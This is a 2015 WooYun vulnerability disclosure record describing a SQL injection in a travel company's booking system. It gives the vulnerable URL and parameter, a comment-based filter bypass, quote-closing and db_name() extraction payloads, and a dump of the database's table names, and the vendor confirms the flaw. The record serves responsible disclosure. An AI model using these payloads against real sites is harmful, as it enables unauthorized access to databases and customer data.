{"id": 45790, "wybug_id": "wooyun-2015-094034", "wybug_title": "苏州同程六合一系统绕过过滤继续SQL注入", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "0x70", "wybug_date": "2015-01-27 21:21", "wybug_open_date": "2015-03-13 21:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向公众公开  简要描述： 苏州同程六合一系统绕过过滤继续SQL注入 详细说明：  前面提交过几个六合一系统的越权: WooYun: 苏州同程六合一系统多处越权 今天来个注入,本身系统对GET  POST是有过滤的,cookie不知道过滤没，但这不重要。5个案例的话这里就不写了，之前写过了,在截图里会体现：注入点：http://www.888777111.cn//website/websitelayout8/cjlinelist/cjlinelistpageinfo?Days=0&EndDateTime=&gid=1422247514970&GroupId=0&LineClass=0&pageIndex=1&ShowType=0&SortType=0&Title=&Type=0&type=3&StartDateTime=1  注入参数 StartDateTime首先程序本身对关键字是有过滤的\n\n\n\n然后就尝试绕过,编码,大小写什么的(FUZZ的过程就略了)尝试出用/**/代替空格即可绕过过滤http://www.888777111.cn//website/websitelayout8/cjlinelist/cjlinelistpageinfo?Days=0&EndDateTime=&gid=1422247514970&GroupId=0&LineClass=0&pageIndex=1&ShowType=0&SortType=0&Title=&Type=0&type=3&StartDateTime=1'/**/and/**/1=1--这样确实绕过了程序的过滤，但是这样的话你输入什么语句都会爆下图错误：\n\n那么根据SQL语句报错的内容可知他的SQL语句是这样写的\n\nselect * from aa where StartDateTime=1 and G.MemberId = 1018041 AND G.IfCheck=3.....那么尝试把SQL语句闭合注入试试'/**/or/**/注入的语句/**/or/**/'1'='1可见成功了\n\n\n\n\n\n\n\n\n\n/**/quotename(db_name(1))%3E0/**/ 爆数据库名 用burp代劳吧\n\n爆表\n\n我是好人,木脱裤   漏洞证明：  Line_TCPF_SceneryGroupLine_TDZT_Response_ComplexContentLine_TCPF_ModuleLine_TCPF_BusTakeOffHLine_TCPF_OrderLine_TCPF_TrafficTakeOffAmountDetailLine_TCPF_LineFinanceLine_Order_SerialSeqLine_TCPF_SceneryGroup_SceneryLine_TCPF_GroupPlannerPermissionLine_TDZT_SaleManLine_SupplierLine_TCPF_MoneyTypeLine_TCPF_BusTakeOffLLine_TDZT_LineLine_TCPF_TrafficTakeOffHLine_TCPF_LineGroupLine_QuotePrice_CustomerVoiceMSreplication_subscriptionsLine_TCPF_SceneryPriceLine_TCPF_GroupPriceMSsubscription_agentsLine_TDZT_TakeOffAmountDetailLine_Supplier_AttachmentLine_TCPF_MyQuickFunctionLine_TCPF_CanCityqynewsLine_TCPF_TrafficTakeOffLLine_TCPF_LineGuiderLine_QuotePrice_RefContentLine_TCPF_SceneryTakeOffAmountDetailLine_TCPF_SceneryGroupLine_TCPF_GroupReserveMSreplication_objectsLine_TDZT_TakeOffHLine_Supplier_BankInfoLine_TCPF_NewsMSsnapshotdeliveryprogressLine_TCPF_CustomerLine_TCPF_TravelAgencyMSsavedforeignkeysLine_TCPF_LineHotelLine_QuotePrice_RefServiceMSsavedforeignkeycolumnsLine_TCPF_SceneryTakeOffHMSsavedforeignkeyextendedpropertiesLine_TCPF_GroupStationIdGeneratorLine_TDZT_TakeOffLLine_Supplier_LinkManLine_TCPF_OpportunityLine_TCPF_CustomerFromLine_TCPF_TravelAgencyTakeOffHLine_TCPF_LineInsuranceLine_QuotePrice_RefServicePriceLine_TCPF_SceneryTakeOffLLine_TCPF_GuiderLine_Book_AirLine_WebSiteLine_SupplierGroupLine_TCPF_CustomerGradeLine_TCPF_TravelAgencyTakeOffLLine_TCPF_LineOtherAnpaiLine_SKTTJLine_TCPF_ShoppingLine_TCPF_HotelLine_Book_AirLogLine_WebSite_ChannelLine_TCPF_CashierLine_TCPF_Order_LogLine_TCPF_CustomerJobTypeLine_TCPF_TravelTakeOffAmountDetailLine_TCPF_LinePlannerPermissionLine_SKTTJ_DetailLine_TCPF_ShoppingTakeOffAmountDetailLine_TCPF_HotelPriceLine_Book_AirPassengerLine_WebSite_ConfigLine_TCPF_Group_logLine_TCPF_OrderAmountDetailLine_TCPF_CustomerPLLine_TCPF_TravelTakeOffHLine_TCPF_LinePriceLine_SKTTJ_SaleLine_TCPF_ShoppingTakeOffHLine_TCPF_HotelTakeOffAmountDetailLine_Book_AirSpecialPriceLine_WebSite_FriendlyLinkLine_TCPF_OrderCancelReviewLine_TCPF_OrderManLine_TCPF_CustomerTypeLine_TCPF_TravelTakeOffLLine_TCPF_LineRefLine_SKTTJ_Sale_DetailLine_TCPF_ShoppingTakeOffLLine_TCPF_HotelTakeOffHLine_Book_HotelLine_WebSite_ImageLine_TCPF_OrderContractExportLogLine_TCPF_OrderPriceLine_TCPF_CustomerTypePerLine_TCPF_WebShopLineLine_TCPF_SceneryGroupLine_TCPF_LineRefContentLine_TCPF_ADLine_TCPF_SLineLine_TCPF_HotelTakeOffLLine_Book_HotelLogLine_WebSite_MessageLine_TCPF_ReviewLine_TCPF_OrderReceiveDetailLine_TCPF_DataDictLine_TCPF_LineRefPriceLine_TCPF_AirTakeOffAmountDetailLine_TCPF_SMSTemplateLine_TCPF_InsuancePriceLine_CJY_DataVisitorLine_WebSite_ModuleLine_TCPF_ReviewStateLine_TCPF_OtherResourceLine_TCPF_DocumentLine_TDZT_LineExtendLine_TCPF_LineRefStationLine_TCPF_AirTakeOffHLine_TCPF_StationLine_TCPF_InsuranceLine_CJY_LineDataLine_WebSite_NewsLine_TCPF_StatementsHLine_TCPF_OtherResourceTypeLine_TCPF_EateryLine_TDZT_LinePassengerLine_TCPF_LineSceneryLine_TCPF_AirTakeOffLLine_TCPF_SupplierLine_TCPF_InsuranceTakeOffAmountDetailLine_CJY_TravelDataLine_WebSite_NewsTypeLine_TCPF_StatementsLLine_TCPF_PrePayLine_TCPF_EateryPriceLine_TDZT_LinePayLine_TCPF_LineScoreDetailLine_TCPF_AttachmentLine_TCPF_TakeOffAmountDetailLine_TCPF_InsuranceTakeOffHLine_CJY_VisitorDataSettingLine_WebSite_SkinLine_WorkFlowLine_TCPF_PrePayDetailLine_TCPF_EateryTakeOffAmountDetailLine_TDZT_LineReceiveLine_TCPF_LineShoppingLine_TCPF_BankAccountLine_TCPF_TakeOffHLine_TCPF_InsuranceTakeOffLLine_DepartmentLine_ZDYTH_RuleLine_WorkFlowNodeLine_TCPF_RemainConfigLine_TCPF_EateryTakeOffHLine_TDZT_LineRefLine_TCPF_LineStationLine_TCPF_BankAccount_BalanceLine_TCPF_TakeOffLLine_Finance_ImprestLine_ZDYTH_SettingLine_WorkFlowNodeSetLine_TCPF_RemainLine_TCPF_EateryTakeOffLLine_TDZT_LineScoreDetailLine_TCPF_LineTrafficLine_TCPF_BankAccount_UserLine_TCPF_TaskLine_TCPF_LineBusLine_Finance_ImprestDetailLine_ZDYTH_UniqueNOLine_TCPF_ReserveLine_TCPF_FMTemplateLine_TDZT_PriceDetailLine_TCPF_LineTravelLine_TCPF_BankAccountLog_TypeLine_TCPF_TaskDetailLine_TCPF_LineChangeAmountLine_InsuranceLine_TCPF_SceneryGroup   修复方案：  过滤吧   版权声明：转载请注明来源 0x70@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-27 22:04 厂商回复：  最新状态： 2015-01-27：感谢关注同程旅游，下午安排开发着手修复了，感谢洞主提前告之。这个点内部报过，标题我也写的绕过防SQL注入，不知道为什么还有项目没有切到更成熟的防注入组件上。其实不用这么麻烦，直接用randomcomments.py tamper脚本就行了。  ", "replys": "漏洞评价：\n评论\n     2015-03-14 09:38 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  厂商给力    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}